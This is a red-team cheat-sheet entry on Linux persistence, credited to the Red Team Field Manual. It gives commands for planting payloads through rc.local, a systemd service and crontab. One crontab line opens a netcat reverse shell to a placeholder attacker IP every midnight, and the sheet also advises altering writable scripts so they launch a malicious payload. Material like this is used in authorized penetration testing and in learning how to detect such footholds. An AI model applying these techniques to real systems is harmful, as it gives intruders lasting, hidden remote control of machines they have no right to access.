---
name: Linux Persistence
category: Post-Exploitation & PrivEsc
description: Linux persistence techniques — rc.local, systemd services, crontab and script poisoning.
tags: [linux, persistence, crontab, systemd, rc-local, RTFM]
---

# Linux Persistence

Persistence techniques for Linux systems.

## rc.local

```bash
nano /etc/rc.local
# or
echo "<FILE_PATH>" >> /etc/rc.local
```

## Systemd service

```bash
nano /etc/systemd/system/<SERVICE>.service
```

```ini
[Unit]
after=network.target
Description=My Service

[Service]
Type=simple
Restart=always
ExecStart=<FILE_PATH>

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl enable <SERVICE>.service
systemctl start <SERVICE>.service
```

## Crontab

```bash
crontab -e
# Netcat reverse shell every day at midnight
0 0 * * * nc <ATTACKER_IP> <PORT> -e /bin/sh

# Run payload every day at midnight
0 0 * * * <FULL_PATH>
```

> More at: [crontab.guru](https://crontab.guru/)

## Script poisoning

Enumerate all persistence methods and look for existing scripts (.sh, .py, etc.) that are modifiable. Modify them to launch a malicious payload.

> Source: RTFM — Red Team Field Manual v2
